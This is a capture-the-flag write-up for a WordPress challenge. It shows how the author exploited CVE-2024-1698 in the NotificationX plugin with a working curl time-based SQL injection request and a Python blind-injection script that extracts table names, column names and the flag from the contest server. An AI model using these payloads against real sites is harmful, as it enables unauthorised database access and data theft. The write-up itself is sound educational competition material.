# SafeBlog1

Just finished setting up my blog. Oops there's a deadline tonight, moving on to my assignments now.

---

![](https://s2.loli.net/2024/04/24/8ghNa4563euPMKU.png)

Opening a website is the default theme and page after WordPress installation.

There is a notification reminder in the bottom left corner, indicating that the Notification X plugin has been used.

Search for relevant vulnerabilities, locate CVE-2024-1698, replicate the vulnerability and perform SQL blind injection.

```bash
curl "http://chall.geekctf.geekcon.top:40523/index.php?rest_route=%2Fnotificationx%2Fv1%2Fanalytics" 'nx_id=1337&type=clicks`=IF(SUBSTRING(version(),1,1)=5,SLEEP(10),null)-- -'
```

Please note that since URL rewriting is not enabled, it is necessary to search/capture the API path for confirmation, rather than directly using payload online.

The following are the POC scripts for reference. The three payloads are to obtain the list of table names for the current database (and locate the fl6g table), to obtain the list of column names for the fl6g table (with only one column of nam3), and to obtain the content of the nam3 column of the fl6g table.

```python
import requests
import string

delay = 5
url = "http://chall.geekctf.geekcon.top:40523/index.php?rest_route=%2Fnotificationx%2Fv1%2Fanalytics"

ans = ""
table_name = "" #fl6g
column_name = "" #nam3
session = requests.Session()

for idx in range(1,1000):
    low = 32
    high = 128
    mid = (low+high)//2
    while low < high:
        payload1 = f"clicks`=IF(ASCII(SUBSTRING((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{idx},1))<{mid},SLEEP({delay}),null)-- -"
        payload2 = f"clicks`=IF(ASCII(SUBSTRING((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x{bytes(table_name,'UTF-8').hex()})),{idx},1))<{mid},SLEEP({delay}),null)-- -"
        payload3 = f"clicks`=IF(ASCII(SUBSTRING((select(group_concat({column_name}))from({table_name})),{idx},1))<{mid},SLEEP({delay}),null)-- -"
        resp = session.post(url=url, data = {
                "nx_id": 1337,
                "type": payload1 # switch payload
            })
        if resp.elapsed.total_seconds() > delay:
            high = mid
        else:
            low = mid+1
        mid=(low+high)//2
    if mid <= 32 or mid >= 127:
        break
    ans += chr(mid-1)
    print(ans)
```

This question is positioned as a simple level question, therefore an entry-level blind annotation path was used to obtain table names, column names, and fields. Some contestants attempted to bruteforce the password hash of administrator users, but since this question is not a dynamic container question, in order to prevent contestants from modifying the database, except for the wpndx_stats where the vulnerability is located (which uses the Insert and UPDATE statements), other data tables only retain SELECT permission. In this case, even if the administrator password is obtained, they cannot log in to the WordPress backend.


In addition, due to the magic mechanism of the Wordpress, if there are multiple threads at the same time to this vulnerability point time blind, will lead to sleep delay overlay, resulting in inaccurate results. I'm sorry I didn't find this problem when I checked the problem.